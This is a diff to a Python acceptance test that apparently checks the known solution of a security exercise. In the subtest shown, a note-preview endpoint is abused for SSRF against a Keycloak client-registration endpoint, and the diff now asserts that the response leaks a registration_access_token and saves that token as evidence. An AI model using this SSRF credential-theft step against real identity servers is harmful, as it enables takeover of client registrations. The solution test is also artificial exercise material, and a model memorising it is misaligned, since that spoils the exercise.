@@ -1210,6 +1210,8 @@ class KeplerOpsKnownSolutionAcceptance(unittest.TestCase):
         with self.subTest(card="K18.2 a note with someone else's authority"):
             # The note preview resolves a source path outside the notes namespace,
             # acting with the preview service identity against the identity registration.
+            # The SSRF targets the real Keycloak DCR endpoint (RFC 7591/7592):
+            # GET /realms/keplerops/clients-registrations/openid-connect/{id}
             registration = directory["support_registration"]
             registration_path = urlsplit(
                 self.discovered_route("identity.registration").replace(
@@ -1219,8 +1221,11 @@ class KeplerOpsKnownSolutionAcceptance(unittest.TestCase):
             before = curl_json(
                 self.discovered_route("staff.note-preview"), "-H", "Content-Type: application/json",
                 "--data-binary", json.dumps({"source_path": source, "method": "GET"}), bearer=dev_secret)
-            self.assertEqual(before["registration_id"], registration)
-            self.evidence["registration_revision"] = before["revision"]
+            # Real Keycloak DCR response: client_id confirms the target registration.
+            # registration_access_token is the concealed credential that only the SSRF reveals.
+            self.assertEqual(before.get("client_id"), registration)
+            self.assertIn("registration_access_token", before)
+            self.evidence["registration_rat"] = before["registration_access_token"]
             self.evidence["ssrf_source"] = source
 
         with self.subTest(card="K18.3 the provider trusts our change"):
